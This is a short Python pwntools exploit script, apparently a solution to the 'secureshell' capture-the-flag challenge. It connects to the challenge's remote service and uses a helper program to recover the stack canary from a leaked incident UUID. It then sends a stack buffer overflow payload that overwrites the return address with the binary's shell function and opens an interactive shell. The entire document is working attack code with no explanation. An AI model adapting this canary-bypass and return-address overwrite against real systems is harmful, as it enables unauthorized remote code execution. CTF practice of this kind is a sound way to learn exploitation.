#!/bin/python2
from pwn import *
bin='./secureshell'
brooter = './brute_rand'

elf = ELF(bin)

shellofs = elf.symbols['shell']


#s = process(bin, env={'SECUREPASSWORD':'ThisIsnttheFlagyadumbo123badbad0xdeadbe3f'})
s = remote("secureshell.wpictf.xyz", 31337)

s.recvuntil('password\n')
s.sendline('no,fuckyou')
s.recvuntil('Incident UUID: ')
incident = s.recvline().strip()

b = process([brooter, incident])
b.recvuntil('Canary is ')
cranary = int(b.recvline().strip(), 16)
b.close()


print ('cranary is ' + hex(cranary))


s.recvuntil('password\n')

#sleep(10)

s.sendline('a' * 0x70 + p64(cranary) + 'b' * 0x8 + p64(shellofs))

s.sendline('ls')
s.interactive()